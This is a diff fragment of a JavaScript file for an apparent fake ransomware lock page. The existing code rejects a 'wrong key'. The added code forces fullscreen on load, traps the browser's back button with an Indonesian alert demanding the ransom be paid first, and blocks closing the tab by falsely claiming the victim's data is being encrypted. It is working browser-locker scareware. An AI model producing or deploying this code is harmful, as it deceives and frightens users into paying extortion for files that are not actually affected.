@@ -17,3 +17,22 @@ function checkKey() {
         alert("❌ WRONG KEY! Your system is still locked!");
     }
 }
+
+// Aktifkan Fullscreen saat halaman dimuat
+document.addEventListener("DOMContentLoaded", function() {
+    if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
+    }
+});
+
+// Blokir tombol kembali
+history.pushState(null, null, location.href);
+window.onpopstate = function () {
+    history.pushState(null, null, location.href);
+    alert("Tidak bisa kembali! Tebusan dulu!");
+};
+
+// Cegah menutup tab
+window.onbeforeunload = function () {
+    return "Data Anda sedang dienkripsi! Yakin ingin keluar?";
+};
